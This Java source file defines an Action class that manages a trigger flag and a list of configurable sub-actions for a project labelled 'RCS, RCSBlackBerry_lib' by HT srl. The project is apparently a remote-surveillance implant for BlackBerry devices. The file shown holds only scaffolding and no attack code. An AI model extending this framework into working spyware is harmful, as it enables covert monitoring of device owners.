/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry_lib 
 * 
 * File         : Action.java 
 * Created      : 26-mar-2010
 * *************************************************/

package com.ht.rcs.blackberry.action;

import java.util.Vector;

import com.ht.rcs.blackberry.Status;
import com.ht.rcs.blackberry.utils.Debug;
import com.ht.rcs.blackberry.utils.DebugLevel;

// TODO: Auto-generated Javadoc
/**
 * The Class Action.
 */
public class Action {

    /** The debug instance. */
	//#debug
    protected static Debug debug = new Debug("Action", DebugLevel.VERBOSE);

    /** The Constant ACTION_UNINIT. */
    public static final int ACTION_UNINIT = -2;

    /** The Constant ACTION_NULL. */
    public static final int ACTION_NULL = -1;

    /** The triggered. */
    private boolean triggered = false;

    /** The sub action list. */
    private Vector subActionList = null;

    /** The Action id. */
    public int actionId = -1;
    
    Status status;

    /**
     * Instantiates a new action.
     * 
     * @param actionId
     *            the action id
     */
    public Action(int actionId_) {
        this.actionId = actionId_;
        subActionList = new Vector();
        status = Status.getInstance();
    }

    /**
     * Adds the new sub action.
     * 
     * @param actionSync
     *            the action sync
     * @param confParams
     *            the conf params
     */
    public final void addNewSubAction(int actionSync, byte[] confParams) {
        SubAction subAction = SubAction.factory(actionSync, confParams);
        addSubAction(subAction);
    }

    /**
     * Adds the sub action.
     * 
     * @param subAction
     *            the sub action
     */
    private synchronized void addSubAction(SubAction subAction) {
        subActionList.addElement(subAction);
    }

    /**
     * Gets the sub actions list.
     * 
     * @return the vector
     */
    public Vector getSubActionsList() {
        return subActionList;
    }

    /**
     * Checks if is triggered.
     * 
     * @return true, if is triggered
     */
    public synchronized boolean isTriggered() {
        return triggered;
    }

    /**
     * Sets the triggered.
     * 
     * @param value
     *            the value
     */
    public synchronized void setTriggered(boolean value) {

        // #debug
        debug.trace(actionId + " triggered:" + value);
        triggered = value;
        if(value)
        {
            status.addActionTriggered(this);
        }else{
            status.removeActionTriggered(this);
        }
    }

    /*
     * (non-Javadoc)
     * 
     * @see java.lang.Object#toString()
     */
    public String toString() {
        return actionId + " sa:" + subActionList.size();
    }
}
